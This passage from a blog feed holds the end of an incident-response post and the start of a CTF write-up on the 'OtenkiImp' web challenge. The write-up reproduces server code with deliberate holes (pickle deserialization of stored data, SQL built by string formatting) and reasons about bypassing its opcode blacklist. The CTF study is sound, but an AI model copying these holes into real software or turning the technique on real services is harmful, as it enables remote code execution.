alt="image-20240604174812558"></p></li></ul></li><li><p>结合日志，查看管理员登录时间、用户名是否存在异常</p><ul><li><p><code>eventvwr.msc</code>：打开事件查看器</p></li><li><p>导出 Windows 日志，利用微软官方工具 <a href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">Log Parser</a> 进行分析：</p><p>登录成功用户和时间</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">LogParser<span class="token punctuation">.</span>exe <span class="token operator">-</span>i:EVT <span class="token string">"SELECT TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,'|') as username FROM 1.evtx where EventID=4624"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li></ol><hr><h2 id="检测异常端口"><a href="#检测异常端口" class="headerlink" title="检测异常端口"></a>检测异常端口</h2><p>检查端口连接情况，是否有远程连接、可疑连接</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/Zerimon/p/16371479.html&quot;&gt;https://www.cnblogs.com/Zerimon/p/16371479.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/Bypass007/Emergency-Response-Notes&quot;&gt;https://github.com/Bypass007/Emergency-Response-Notes&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="应急响应" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF X HDCTF 2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/02/DASCTF-X-HDCTF-2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/02/DASCTF-X-HDCTF-2024/</id>
    <published>2024-06-02T02:00:09.000Z</published>
    <updated>2024-06-03T10:44:49.803Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>das偶遇b神出题，java&amp;.net&amp;python强如怪物，拼尽全力也无法战胜😭（也就是又爆零了）</p><p>应该是近期最后一次打ctf了，剩下的事交给复现了</p><p>官方wp：<a href="https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#">https://www.yuque.com/yuqueyonghu30d1fk/gd2y5h/ksfsfw8yf1u2xhhq?singleDoc#</a></p><span id="more"></span><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="OtenkiImp-Unsolved"><a href="#OtenkiImp-Unsolved" class="headerlink" title="OtenkiImp (Unsolved)"></a>OtenkiImp (Unsolved)</h2><p>又是百分百晴天女</p><p>f12发现&#x2F;hint</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> aiohttp <span class="token keyword">import</span> web<span class="token keyword">import</span> time<span class="token keyword">import</span> json<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickle<span class="token keyword">import</span> time<span class="token keyword">import</span> aiomysql<span class="token keyword">from</span> settings <span class="token keyword">import</span> config<span class="token punctuation">,</span> messages<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">mysql_init</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">:</span>    mysql_conf <span class="token operator">=</span> app<span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'mysql'</span><span class="token punctuation">]</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            mysql_pool <span class="token operator">=</span> <span class="token keyword">await</span> aiomysql<span class="token punctuation">.</span>create_pool<span class="token punctuation">(</span>host<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    port<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'port'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    user<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    password<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                                                    db<span class="token operator">=</span>mysql_conf<span class="token punctuation">[</span><span class="token string">'db'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>on_shutdown<span class="token punctuation">.</span>append<span class="token punctuation">(</span>mysql_close<span class="token punctuation">)</span>    app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span> <span class="token operator">=</span> mysql_pool    <span class="token keyword">return</span> app<span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">mysql_close</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">:</span>    app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>wait_closed<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./static/index.html"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        html <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>html<span class="token punctuation">,</span> content_type<span class="token operator">=</span><span class="token string">"text/html"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> status<span class="token operator">=</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'i'</span><span class="token punctuation">,</span> <span class="token string">b'o'</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'V'</span><span class="token punctuation">,</span> <span class="token string">b'__setstate__'</span><span class="token punctuation">]</span>    white_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'__main__'</span><span class="token punctuation">,</span> <span class="token string">b'builtins'</span><span class="token punctuation">,</span> <span class="token string">b'contact'</span><span class="token punctuation">,</span> <span class="token string">b'time'</span><span class="token punctuation">,</span> <span class="token string">b'dict'</span><span class="token punctuation">,</span> <span class="token string">b'reason'</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> white_list<span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">getWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    wishes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes where id=&#123;id&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                        <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes'</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                datas <span class="token operator">=</span> <span class="token keyword">await</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token punctuation">)</span> <span class="token keyword">in</span> datas<span class="token punctuation">:</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">:</span>            wishes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>wishes<span class="token punctuation">)</span><span class="token punctuation">,</span> content_type<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">addWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"place"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"reason"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"date"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">1000</span><span class="token punctuation">)</span>        <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>        wish <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'insert into wishes(`id`, `wish`) values (&#123;id&#125;, "&#123;wish&#125;")'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                    <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token operator">=</span>wish<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">rmWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                sql <span class="token operator">=</span> <span class="token string">'delete from wishes'</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">hint</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        source <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>source<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">]</span> <span class="token operator">=</span> config    app<span class="token punctuation">.</span>router<span class="token punctuation">.</span>add_static<span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> path<span class="token operator">=</span><span class="token string">'./static'</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>add_routes<span class="token punctuation">(</span><span class="token punctuation">[</span>web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/waf'</span><span class="token punctuation">,</span> waf<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'/addWishes'</span><span class="token punctuation">,</span> addWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/getWishes'</span><span class="token punctuation">,</span> getWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'/rmWishes'</span><span class="token punctuation">,</span> rmWishes<span class="token punctuation">)</span><span class="token punctuation">,</span>                    web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'/hint'</span><span class="token punctuation">,</span> hint<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    app <span class="token operator">=</span> mysql_init<span class="token punctuation">(</span>app<span class="token punctuation">)</span>    web<span class="token punctuation">.</span>run_app<span class="token punctuation">(</span>app<span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意到aiohttp&#x2F;3.8.4</p><p>尝试<a href="https://github.com/wy876/POC/blob/main/aiohttp%E5%AD%98%E5%9C%A8%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E(CVE-2024-23334).md">CVE-2024-23334</a>失败，因为这里是<code>app.router.add_static(&#39;/static&#39;, path=&#39;./static&#39;)</code>，没开<code>follow_symlinks</code></p><p>审一下代码</p><p>最终利用点应该是pickle反序列化，即<code>getWishes</code>方法里的<code>wishes.append(pickle.loads(base64.b64decode(wish)))</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">getWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    wishes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token builtin">id</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        pool <span class="token operator">=</span> request<span class="token punctuation">.</span>app<span class="token punctuation">[</span><span class="token string">'mysql_pool'</span><span class="token punctuation">]</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> pool<span class="token punctuation">.</span>acquire<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> cur<span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    <span class="token builtin">id</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes where id=&#123;id&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>                        <span class="token builtin">id</span><span class="token operator">=</span><span class="token builtin">id</span><span class="token punctuation">)</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    sql <span class="token operator">=</span> <span class="token string">'select id,wish from wishes'</span>                <span class="token keyword">await</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>                datas <span class="token operator">=</span> <span class="token keyword">await</span> cur<span class="token punctuation">.</span>fetchall<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>messages<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token builtin">id</span><span class="token punctuation">,</span> wish<span class="token punctuation">)</span> <span class="token keyword">in</span> datas<span class="token punctuation">:</span>        <span class="token keyword">if</span> check<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">:</span>            wishes<span class="token punctuation">.</span>append<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>wish<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> web<span class="token punctuation">.</span>Response<span class="token punctuation">(</span>text<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>wishes<span class="token punctuation">)</span><span class="token punctuation">,</span> content_type<span class="token operator">=</span><span class="token string">"application/json"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接下来往前看条件，首先是<code>check</code>方法</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    black_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'R'</span><span class="token punctuation">,</span> <span class="token string">b'i'</span><span class="token punctuation">,</span> <span class="token string">b'o'</span><span class="token punctuation">,</span> <span class="token string">b'b'</span><span class="token punctuation">,</span> <span class="token string">b'V'</span><span class="token punctuation">,</span> <span class="token string">b'__setstate__'</span><span class="token punctuation">]</span>    white_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">b'__main__'</span><span class="token punctuation">,</span> <span class="token string">b'builtins'</span><span class="token punctuation">,</span> <span class="token string">b'contact'</span><span class="token punctuation">,</span> <span class="token string">b'time'</span><span class="token punctuation">,</span> <span class="token string">b'dict'</span><span class="token punctuation">,</span> <span class="token string">b'reason'</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> white_list<span class="token punctuation">:</span>        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> black_list<span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>限制了黑名单和白名单，白名单是替换为空，很明显可以用双写绕过</p><p>然后是前面的数据库查询，传入参数查询数据库，把查询结果中的<code>wish</code>取出来，那么我们首先得想办法往数据库里插入pickle语句</p><p>那么就是<code>addWishes</code>方法：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">addWishes</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"place"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"reason"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"date"</span><span class="token punctuation">)</span> <span class="token keyword">and</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data<span class="token punctuation">[</span><span class="token string">"contact"</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"contact"</span><span class="token punctuation">)</span>        data<span class="token punctuation">[</span><span class="token 